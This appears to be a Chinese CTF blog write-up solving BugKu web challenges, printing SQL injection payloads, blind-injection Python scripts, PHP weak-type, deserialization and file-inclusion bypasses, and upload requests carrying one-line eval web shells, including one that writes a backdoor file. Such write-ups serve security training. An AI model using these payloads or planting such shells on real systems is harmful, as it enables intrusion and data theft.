---
title: BugKu-CTF Web Write Up
date: 2018-03-09 15:29:30
categories: Write Up
tags:
 - ctf
 - wp
description:
---
[BugkuCTF-新版](http://ctf.bugku.com/challenges)
[Bugku-旧版](http://123.206.31.85/login?next=challenges)

<!-- more -->
<br>
## Web

### Web2
右键审查元素，仔细观察得到flag
<br>

### 文件上传测试
bp抓包，文件名后缀大小写绕过得到flag
<br>

### 计算题
页面有前端限制，右键源代码，更改input的maxlength属性，即可
<br>

### web基础$GET
`url?what=flag`，得到flag
<br>

### web基础$POST
HackBar发送post请求，POSTDATA为`what=flag`即可。

<br>

### 矛盾
```php
$num=$_GET['num'];
if(!is_numeric($num))
{
echo $num;
if($num==1)
echo 'flag{**********}';
}
```
传入`url?num=1a`
由于1a不是数字，所以能通过`!is_numeric()`的验证
利用PHP弱类型的松散性，`"1a"==1`，得到flag

<br>

### Web3
右键源代码，看见一串HTML实体编码，解码得到flag

<br>

### sql注入
```
http://103.238.227.13:10083/?id=0%df' union select 1,database() %23
http://103.238.227.13:10083/?id=0%df' union select 1,string from sql5.key %23
```
这道题有一个需要非常细心观察的地方，就是网页的编码格式为GB2312
如果有测试的话，会发现单引号会过滤或者转移，后来测试后发现是被转移，那么可以利用**宽字节注入**
在之后有一个无比坑爹的地方，就是直接查询key表会报错，然后想了半天，看看了下别人的writeup
原来是key在原本的查询过程中是字段名，在后者的查询是表明，那么就起了冲突，解决方法
 - 用反引号包住key
 - 直接指定库名

<br>

### 域名解析
如果直接去访问`flag.bugku.com`是不存在DNS解析的，所以直接访问IP地址，但是会显示400错误页面，则该地址不能直接用IP去访问。
其中有一个办法就是更改主机的HOST文件，即可。
然后我用的是另一个办法，访问IP地址后用BP抓包，在将Host修改为域名。(这边自己猜测他是根据HOST去判断的)
```http
GET / HTTP/1.1
Host: flag.bugku.com
Connection: close
```
<br>

### SQL注入1
```php
//过滤sql
$array = array('table','union','and','or','load_file','create','delete','select','update','sleep','alter','drop','truncate','from','max','min','order','limit');
foreach ($array as $value)
{
	if (substr_count($id, $value) > 0)
	{
		exit('包含敏感关键字！'.$value);
	}
}

//xss过滤
$id = strip_tags($id);

$query = "SELECT * FROM temp WHERE id={$id} LIMIT 1";
```
审计后会发现，页面先去判断是否有关键字存在，在去利用`strip_tags()`过滤xss
那么可以借助这点来构建
`http://103.238.227.13:10087/?id=1 unio<>n selec<>t 1,hash fro<>m `key`  %23`
<br>

### 你必须让他停下
进入页面会不断刷新页面，直接右键源代码，提示flag的位置，但是并没有
后面猜测flag是随机会刷出，利用bp抓包一段时间，直接筛选报文长度，得到不同的几个
观察后得到flag
<br>

### 本地包含
```php
include "waf.php";
include "flag.php";
$a = @$_REQUEST['hello'];
eval( "var_dump($a);");
show_source(__FILE__);
```
仔细审计后，其实传入变量可以执行任意代码了，可以选择闭合代码或者直接执行。
`http://120.24.86.145:8003/?hello=file("flag.php")`
`http://120.24.86.145:8003/?hello=);print_r(file("flag.php")`
<br>

### 变量1
```php
error_reporting(0);
include "flag1.php";
highlight_file(__file__);
if(isset($_GET['args'])){
    $args = $_GET['args'];
    if(!preg_match("/^\w+$/",$args)){
        die("args error!");
    }
    eval("var_dump($$args);");
}
```
审计有两个关键点，只能输入字母下划线，`var_dump($$args)`
那么可以打印php中的所有变量，如果flag值存在一个变量中的话。
`http://120.24.86.145:8004/index1.php?args=GLOBALS`
查看，得到flag
<br>

### Web4
右键查看源码，看见一串JS代码，扔到控制台里面执行，并且把eval改为alert，得到代码
```js
function checkSubmit(){
  var a=document.getElementById("password");
  if("undefined"!=typeof a){
    if("67d709b2b54aa2aa648cf6e87a7114f1"==a.value)return!0;alert("Error");a.focus();return!1
  }
}
document.getElementById("levelQuest").onsubmit=checkSubmit;
```
审计后得知，其实只要发送一个post请求即可，因为这段js执行成功后也只是发送post请求
```
[POST DATA]
flag=67d709b2b54aa2aa648cf6e87a7114f1
```

<br>

### Web5
查看源代码，发现一段JSFuck编码后的字符串
直接扔到控制台运行，得到flag

<br>

### 头等舱
访问页面什么都没有，然后查看响应头，发现flag
<br>

### flag在index里
进入页面右键源代码，发现文件包含漏洞，根据题目直接利用php://filter得到index.php源码
`http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php`
<br>

### 输入密码查看flag
提示了5位密码，直接利用burp进行爆破，得到flag
<br>

### 前女友
右键源代码，发现链接`<a class="link" href="code.txt" target="_blank">链接</a>`
访问得到源码
```php
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    $v3 = $_GET['v3'];
    if($v1 != $v2 && md5($v1) == md5($v2)){
        if(!strcmp($v3, $flag)){
            echo $flag;
        }
    }
}
```
```php
http://118.89.219.210:49162/?v1[]=1&v2[]=2&v3[]=3
当三个参数都为数组时，v1和v2进行比较，由于数组之间比较，只要key对应的value相同。则
$v1 != $v2 // true
由于md5()传入数组，会返回NULL，则
(md5($v1) == md5($v2)) = (NULL == NULL) // true
由于strcmp()传入数组，会返回NULL，则
!strcmp($v3, $flag) = !NULL // true
得到flag
```

<br>

### 点击一百万次
右键源代码,查看源代码，发现点击超过1000000次后会发送post请求，直接利用hackbar发送POST请求即可
```
[POST DATA]
clicks=999999999
```
<br>

### 听说备份是个好习惯
题目的备份提醒，直接访问index.php.bak，得到源码
```php
include_once "flag.php";
ini_set("display_errors", 0);
$str = strstr($_SERVER['REQUEST_URI'], '?');
$str = substr($str,1);
$str = str_replace('key','',$str);
parse_str($str);
echo md5($key1);

echo md5($key2);
if(md5($key1) == md5($key2) && $key1 !== $key2){
    echo $flag."取得flag";
}
```
审计后发现对key进行过滤，并且需要满足md5后相等
那么利用php弱类型，以及双写或者url都可绕过
```
双写绕过
http://120.24.86.145:8002/web16/?kekeyy1=QNKCDZO&&kekeyy2=s878926199a

对key进行url编码
http://120.24.86.145:8002/web16/?%6b%65%791=QNKCDZO&&%6b%65%792=s878926199a

```
<br>

### 成绩单
```sql
id=0'||1 order by 5 #
id=0'||1 order by 4 #
id=0' union select 1,2,3,4 #
id=0' union select 1,2,3,database() #           -- skctf_flag
id=0' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema= 0x736b6374665f666c6167 #   -- fl4g,sc
id=0' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name= 0x666c3467 #   -- skctf_flag
id=0' union select 1,2,3,skctf_flag from fl4g #                     '
```

<br>

### 秋名山老司机
利用python脚本跑出flag即可，需要运行多次
```python
import requests
import re

url = "http://120.24.86.145:8002/qiumingshan/"
s = requests.Session()
response = s.get(url).text
data = re.findall(r"<div>(.*)</div>", response)
print(data)
value = eval(data.pop().split("=")[0])
print(value)
datas = {"value": value}
print(s.post(url, data=datas).text)
```
<br>

### 速度要快
需要注意的就是两次base64编码，以及保持Session
```python
import requests
import base64

s = requests.Session()
url = "http://120.24.86.145:8002/web6/"
data = s.get(url).headers["flag"]
print(data)
data = str(base64.b64decode(data), encoding="utf-8")
print(data)
data = base64.b64decode(data.split(": ")[1])
print(data)
data = {"margin": data}
print(s.post(url, data=data).text)
```

<br>

### cookies欺骗？？
对url的filename参数进行解密，知道了，页面能读取任意文件，写python脚本如下
```python
import requests
import base64

url = "http://120.24.86.145:8002/web11/index.php"
filename = base64.b64encode(b"index.php")
for i in range(50):
    data = {"line": i, "filename": filename}
    line = requests.get(url, params=data).text
    print(line)
    with open("index.php", "a") as f:
        f.write(line)
```
得到index.php源码
```php
error_reporting(0);
$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");
$line=isset($_GET['line'])?intval($_GET['line']):0;
if($file=='') header("location:index.php?line=&filename=a2V5cy50eHQ=");
$file_list = array(
'0' =>'keys.txt',
'1' =>'index.php',
);
if(isset($_COOKIE['margin']) && $_COOKIE['margin']=='margin'){
$file_list[2]='keys.php';
}
if(in_array($file, $file_list)){
$fa = file($file);
echo $fa[$line];
}
```
审计分析后，需要满足cookie中带有margin值，并且margin=margin，利用burp重发请求包
```http
GET /web11/index.php?line=0&filename=a2V5cy5waHA= HTTP/1.1
Host: 120.24.86.145:8002
Cookie: PHPSESSID=fr0hdcb1acm2mn5r2f867d1c9i672g78; margin=margin
```
得到flag
<br>

### XSS

<br>

### never give up
右键源代码，会看见`1p.html`的提示，访问后，发现页面会马上跳转，bp直接看响应报文
```javascript
var Words ="%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E"
function OutWord()
{
var NewWords;
NewWords = unescape(Words);
document.write(NewWords);
}
OutWord();
```
在控制台里面直接执行代码，会直接发生跳转，所以先赋予变量，在`unescape`，得到内容如下。
```
<script>window.location.href='http://www.bugku.com';</script>
<!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==-->"
```
观察是BASE64编码，那么先解码,得到
```
%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E
```
明显的URL编码，在去进行URL解码，得到
```php
if(!$_GET['id'])
{
	header('Location: hello.php?id=1');
	exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
	echo 'no no no no no no no';
	return ;
}
$data = @file_get_contents($a,'r');
if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
	require("f4l2a3g.txt");
}
else
{
	print "never never never give up !!!";
}
```
审计后得知，对与三个变量需要满足以下条件
 1. `$id==0 && !$_GET['id']==False`
 当`$id=a1`，那么利用PHP弱类型特性`"a1==0"`，则满足前者
 并且`a1`自动转换为bool类型为true，则满足后者
 2. `file_get_contents($a,'r')=="bugku is a nice plateform!"`
 当`$a=="php://input"`，`php://input`会拿到POST请求数据流，加上`file_get_content()`就等于打开了php://input请求流，那么拿到的就是POST数据，既可满足
 3. `strlen($b)>5 && eregi("111".substr($b,0,1),"1114") && substr($b,0,1)!=4)`
 当`$b=%0012345`时，eregi()函数具有%00截断漏洞，即可满足条件，具体可看[php函数漏洞小结](http://byxs0x0.top/2018/03/06/php-func-vul/)

 ```
 payload
 http://120.24.86.145:8006/test/hello.php?id=a1&&a=php://input&&b=%00123456
 [POST DATA]
 bugku is a nice plateform!
 ```


<br>
### welcome to bugkuctf
右键源代码，得到
```php
$user = $_GET["txt"];  
$file = $_GET["file"];  
$pass = $_GET["password"];  

if(isset($user)&&(file_get_contents($user,'r')==="welcome to the bugkuctf")){  
    echo "hello admin!<br>";  
    include($file); //hint.php  
}else{  
    echo "you are not admin ! ";  
}
```
同上题，利用`php://input`来满足`file_get_contents($user,'r')==="welcome to the bugkuctf"`
`include($file)`是典型的文件包含，可以利用php://filter来读取源码，先读取hint.php源码
```
http://120.24.86.145:8006/test1/?txt=php://input&&file=php://filter/read=convert.base64-encode/resource=hint.php&&password=3
[POST DATA]
welcome to the bugkuctf
```
hint.php
```php
class Flag{//flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file);
			echo "<br>";
		return ("good");
        }  
    }  
}  
```
flag.php无法读取，那么在读取index.php
```php
$txt = $_GET["txt"];  
$file = $_GET["file"];  
$password = $_GET["password"];  

if(isset($txt)&&(file_get_contents($txt,'r')==="welcome to the bugkuctf")){  
    echo "hello friend!<br>";  
    if(preg_match("/flag/",$file)){
		echo "ä¸è½ç°å¨å°±ç»ä½ flagå¦";
        exit();  
    }else{  
        include($file);   
        $password = unserialize($password);  
        echo $password;  
    }  
}else{  
    echo "you are not the number of bugku ! ";  
}  
```
审计后，其实只需要序列化Flag。利用当Flag对象被转换为字符串时，会执行__tostring()，而该方法中，又会包含$file参数并且输出内容，那么只需要Flag的file参数=flag.php，
反序列化后被输出，便会达到任意文件读取的漏洞。
本地执行一下代码，赋值，并且序列化Flag对象
```php
$a = new Flag;
$a->file = "flag.php";
echo serialize($a);
//"Flag":1:{s:4:"file";s:8:"flag.php";}
```
代码从上到下，最开始的条件我们已经满足，所以我们直接包含hint.php文件，将Flag类包含进去，然后利用$password会被反序列化，遍可以得到flag
```
http://120.24.86.145:8006/test1/?txt=php://input&file=hint.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}

[POST DATA]
welcome to the bugkuctf
```

还有一条思路就是，直接利用文件包含漏洞任意执行php代码，写入一句话后门。菜刀连接，即可得到flag
```
http://120.24.86.145:8006/test1/?txt=php://input&file=data://text/plain,<?php fputs(fopen("shells.php","w"),"<?php eval($_GET[a]) ?>");phpinfo();  ?>&password=3&a=$_POST[a]
[POST DATA]
welcome to the bugkuctf
```

<br>

### 过狗一句话
根据提示的代码，可以执行任意命令了。
```
得到当前目录列表
http://120.24.86.145:8010/?s=print_r(scandir('./'))

访问flag.txt文件，得到flag
```
<br>


### 字符？正则？
```php
highlight_file('2.php');
$key='KEY{********************************}';
$IM= preg_match("/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i", trim($_GET["id"]), $match);
if( $IM ){
  die('key is: '.$key);
}
```
考验正则表达式，其中有两个注意点是最后的i代表同时匹配大小写字母，[[:punct:]]代表任意标点符号。
`http://120.24.86.145:8002/web10/?id=key1key1234key:/1/1keya.`
<br>


### 前女友(SKCTF)
右键源代码，发现字中藏有链接，点开链接，得到代码
```php
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    $v3 = $_GET['v3'];
    if($v1 != $v2 && md5($v1) == md5($v2)){
        if(!strcmp($v3, $flag)){
            echo $flag;
        }
    }
}
```
`http://118.89.219.210:49162/?v1[]=1&v2[]=2&v3[]=3`
利用PHP弱类型的特性，当md5或strcmp传入数组时，会返回null，来达到绕过。

<br>

### login1(SKCTF)
根据提示利用[SQL约束攻击](http://goodwaf.com/2016/12/30/%E5%9F%BA%E4%BA%8E%E7%BA%A6%E6%9D%9F%E6%9D%A1%E4%BB%B6%E7%9A%84SQL%E6%94%BB%E5%87%BB/)，可以构建出与其他用户相同的用户名来达到攻击目的。
先随便注册一个用户，然后进行登录，会发现权限不足，需要admin账户
那么先注册一个用户用户名为`admin                 123`，密码随意，便实现了SQL约束攻击，创建了一个“用户名为admin的账户”，然后账户为`admin`，密码为所填的登录即可。

<br>

### 你从哪里来
修改为google的Referer即可
```http
GET /from.php HTTP/1.1
Host: 120.24.86.145:9009
Referer: https://www.google.com
Connection: close
Upgrade-Insecure-Requests: 1
```

<br>

### 各种绕过
```php
highlight_file('flag.php');
$_GET['id'] = urldecode($_GET['id']);
$flag = 'flag{xxxxxxxxxxxxxxxxxx}';
if (isset($_GET['uname']) and isset($_POST['passwd'])) {
    if ($_GET['uname'] == $_POST['passwd'])

        print 'passwd can not be uname.';

    else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&($_GET['id']=='margin'))

        die('Flag: '.$flag);

    else

        print 'sorry!';

}
```
利用PHP弱类型特性，SHA1()传入数组，会返回null值，那么`sha1($_GET['uname']) === sha1($_POST['passwd']`
```
http://120.24.86.145:8002/web7/?uname[]=123&id=margin
[POST DATA]
passwd[]=1234
```

<br>

### web8
```php
extract($_GET);
if (!empty($ac))
{
  $f = trim(file_get_contents($fn));
  if ($ac === $f)
{
  echo "<p>This is flag:" ." $flag</p>";
}
else
{
  echo "<p>sorry!</p>";
}
}
```
extract可以实现变量覆盖，那么$fn和$ac都是可控变量，在利用php伪协议，便可满足条件
```
http://120.24.86.145:8002/web8/?ac=a&fn=php://input
[POST DATA]
a
```


<br>

### 细心
提示说需要变成admin
进入页面，右键源代码，没有什么信息，然后扫目录，发现有robots.txt文件，访问后得到还有`/resusl.php`页面。
访问后发现IP会被记录在日志中,并且页面会根据`if ($_GET[x]==$password)`来判断你是否是管理员，初次思考，觉得是SQL注入，得到管理员密码登录，然后测试多次后，无果。
第二条思路，尝试弱口令爆破，发现`x=admin`时，得到flag。


<br>

### 求getshell
看了别人的writeup知道解法，觉得如果经过代码审计后可以知道。但是按照常规思路还是很困难，不过CTF不就是需要脑洞吗。
解法需要两点，
 - Content-Type值大小写混写
 - 上传php5后缀的文件。
```http
POST /web9/index.php HTTP/1.1
Host: 120.24.86.145:8002
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: Multipart/form-data; boundary=---------------------------175241886012639
Content-Length: 330

-----------------------------175241886012639
Content-Disposition: form-data; name="file"; filename="php.php5"
Content-Type: image/gif

GIF9a
<?php
@eval($_POST[byxs]);
?>
-----------------------------175241886012639
Content-Disposition: form-data; name="submit"

Submit
-----------------------------175241886012639--
```
<br>

### INSERT INTO注入
题目直接给了源码，查看知道insert注入，注意代码中对`,`进行了处理
```
由于不出现报错信息，也不回显插入信息，所以不能利用报错注入
检测出注入点，可时间盲注
X-Forwarded-For: 1' and sleep(2)) #
```
后来写出python脚本，编程太渣，人工查看
```python
# -*- coding:utf-8 -*-
import requests


DATA = ""
# 遍历循环所有的字符可能
for i in range(1, 100):
    print("-"*50 + str(i) + "-"*50)
    for j in range(32, 128):
        # 发送请求
        url = "http://120.24.86.145:8002/web15/"
        # 得到当前数据库 (web15)
        # payload = "1' and (select case when (ascii(mid(database() from " + str(i) + " for 1)))=" + str(j) + " then sleep(10) else sleep(0) end))#"
        # 得到当前数据库的所有表名 (client_ip,flag)
        # payload = "1' and (select case when (ascii(mid(group_concat(table_name) from " + str(i) + " for 1)))=" + str(j) + " then sleep(10) else sleep(0) end from information_schema.tables where table_schema = 0x7765623135))# "
        # 得到当前表的所有列名 (flag)
        # payload = "1' and (select case when (ascii(mid(group_concat(column_name) from " + str(i) + " for 1)))=" + str(j) + " then sleep(10) else sleep(0) end from information_schema.columns where table_name = 0x666c6167))# "
        # 得到指定字段所有数据
        payload = "1' and (select case when (ascii(mid(group_concat(flag) from " + str(i) + " for 1)))=" + str(j) + " then sleep(10) else sleep(0) end from flag))# "
        header = {"X-Forwarded-For": payload}
        try:
            # 没超时
            requests.get(url, headers=header, timeout=10)
        except requests.exceptions.Timeout:
            # 超时，说明匹配
            DATA += chr(j)
            print(DATA)
            break
# 循环到结尾,说明已经到最后一个字符串，停止并输出结果

# 这边没有做处理，直接看i是否重复出现两次，如果重复说明到结尾了
```
<br>

### 这是一个神奇的登录框
```sql
admin_name=0"||1#&admin_passwd=    # 回显用户名信息
admin_name=0"||1 order by 3#&admin_passwd= # 报错
admin_name=0"||1 order by 2#&admin_passwd=  # 列数为2
admin_name=0" union select database(),2 #&admin_passwd=   # bugkusql1
admin_name=0" union select group_concat(table_name),2 from information_schema.tables where table_schema= 0x6275676b7573716c31 #&admin_passwd=         # flag1,whoami
admin_name=0" union select group_concat(column_name),2 from information_schema.columns where table_name= 0x666c616731 #&admin_passwd=  # flag1
admin_name=0" union select flag1,2 from flag1 #&admin_passwd=   # 得到flag

" 利用报错注入也能完成，因为报错信息没有被关闭
```
<br>

### 多次
```sql
http://120.24.86.145:9004/Once_More.php?id=9999' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = 0x776562313030322d32 ),1),1) %23
class,flag2
http://120.24.86.145:9004/Once_More.php?id=9999' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name =0x666c616732 ),1),1) %23
flag2,address
http://120.24.86.145:9004/Once_More.php?id=9999' and updatexml(1,concat(0x7e,(select group_concat(address) from flag2 ),1),1) %23
http://120.24.86.145:9004/Once_More.php?id=9999' and updatexml(1,concat(0x7e,(select group_concat(flag2) from flag2 ),1),1) %23
./Have_Fun.php

```
```
Sorry,Only IP:192.168.0.100 Can Access This Site
GET /Have_Fun.php HTTP/1.1
Host: 120.24.86.145:9004
CLIENT-IP: 192.168.0.100
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Cookie: PHPSESSID=kup3c61asesap930inhocglh7tdgohi0
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1


```

```
你……你……你可以看到我? 好吧，我来自于ErWeiMa.php 顺便告诉你两个密码 one:参数名是game; tow:flag在admin里 对了,文件后@…c=Y&$as%_=#*ad…*@#！*&@…c……
```
<br>

### PHP_encrypt_1(ISCCCTF)

<br>

### 文件包含2
进入页面，发现文件包含漏洞，利用php伪协议或者http都发现被过滤
然后看一下hello.php，这边有个坑的点，响应报文提示了`include.php`，但是没这文件，可能不是这个意思吧？
右键源代码，发现`upload.php`
接下来思路比较明确，上传一个带有php代码的文件，然后包含即可。
然而发现对`<?php`和`?>`也有着过滤，并且大小写不能突破，那么利用<sciprt>的方式绕过，上传的文件内容如下
```
GIF9a
<script language="php">
@eval($_POST[byxs])
</script>
```
<br>

### flag.php
脑洞打开，**hint居然是参数参数参数!!!!**
`http://120.24.86.145:8002/flagphp/?hint=1`得到下面代码(删减版)
```php
error_reporting(0);
include_once("flag.php");
$cookie = $_COOKIE['ISecer'];
if(isset($_GET['hint'])){
    show_source(__FILE__);
}
elseif (unserialize($cookie) === "$KEY")
{   
    echo "$flag";
}
$KEY='ISecer:www.isecer.com';
```
审计过后，只需要反序列化后的$cookie参数和$KEY相同，然后注意的是，$KEY在开始并没有被定义。
在本地调试，得到序列化结果
```php
$cookie = serialize('');
echo $cookie; //s:0:"";
var_dump(unserialize($cookie) === "$KEY"); //bool(true)
```
发送HTTP请求，带上Cookie参数即可得到flag (注意Cookie中的;需要经过URL编码)
```http
GET /flagphp/ HTTP/1.1
Host: 120.24.86.145:8002
Cookie: ISecer=s:0:""%3b
Connection: close
```

<br>

### 报错注入
```sql
被过滤的字符
union||mid||空格||单引号||双引号||- -

判断注入点
?id=1
?id=0
?id=0||1   # 页面回显id=1的界面

得到数据
?id=1||updatexml(1,concat(0x7e,database(),0x7e),1)      #sql4

根据提示得到文件内容，由于报错函数每次报出的字符有限制，所以分割字符串来爆出
?id=1||updatexml(1,concat(0x7e,(substr(load_file(0x2f7661722f746573742f6b65795f312e706870),1,30)),0x7e),1)

注意: <?php 部分需要查看源代码才能查看
最后拼得文件内容如下
<?php fdsafasfdsafidsafdsaifdsakfdsaifdsafdsafdsafdsafkdsa;fdsafdsafsdafdsafas0hfdsg9Flag:"7249f5a7fd1de602b30e6f39aea6193a"fsdafsafdsafdsafdsafa ?>

提交flag有个小坑，文件内的双引号和提交flag的双引号不同
```

<br>

### login3
提示说根据bool盲注，基本就说明了帐号正确密码错误和帐号错误密码错误给出的提示必定是两种状态。
```sql
页面提示 username does not exist!
username=1&password=2

页面提示 password error!
username=1'||1#&password=2      
username=1'||(2>1)#&password=2
```
由此可以判断注入点，也可以猜测验证登录过程的代码
1. 根据用户去查找数据库记录
2. 如果没有，提示username does not exist!
3. 如果有，将参数中的密码进行MD5加密，在和数据库取得的用户密码进行对比
4. 相等，登录成功。不想等，提示password error!

已经找到注入点，接下来构建bool盲注需要构建的payload

测试下来被过滤的字符
`union || for || , || 空格 || + || /**/ || and`
由于`for`被过滤，不能直接查询`information_schema`表，只能尝试爆破表名和列名
`空格 || + || /**/`被过滤，尝试利用空格，来构建不使用空格的payload
不能使用逗号，也使用另外一种写法来完成，最后构建payload
`username=1'||(ascii(mid((select(password)from(admin))from(1)))>1)#&password=2`

利用python写出脚本
```python
import re
import requests

DATA = ""
for i in range(1, 100):
    low = 32
    high = 126
    mid = (low + high) >> 1
    while mid < high:
        # 根据bool来判断
        url = "http://118.89.219.210:49167/index.php"
        data = {"username": "1'||(ascii(mid((select(password)from(admin))from(" + str(i) + ")))>" + str(mid) + ")#", "password": "2"}
        text = requests.post(url, data=data).text
        isHas = re.findall(r"<p align='center'>username", text)
        if isHas:
            # 存在，说明条件不成立，改变上限
            high = mid
        else:
            # 不存在，条件成立，改变下限
            low = mid + 1
        # 重新计算
        mid = (low + high) >> 1
    DATA += chr(mid)
    print(DATA)


```
得到admin表中第一个账户的密码`51b7a76d51e70b419f60d3473fb6f900`
然后寻找了n多站点，发现都不能解密，cmd5需要付费，然后找到后面终于有一个能够解出
[MD5解密站点](https://somd5.com/)
解密得到用户的密码，直接登录，得到flag

<br>

## 代码审计
其中原理没有讲清楚，可以参照我的[php函数漏洞小结](http://byxs0x0.cn/2018/03/06/php-func-vul/)和[php弱类型小结](http://byxs0x0.cn/2018/03/06/php-weak-type/)

### extract变量覆盖
```php
$flag='xxx';
extract($_GET);
if(isset($shiyan))
{
  $content=trim(file_get_contents($flag));
if($shiyan==$content)
{
  echo'flag{xxx}';
}
else
{
  echo'Oh.no';
}
}
```
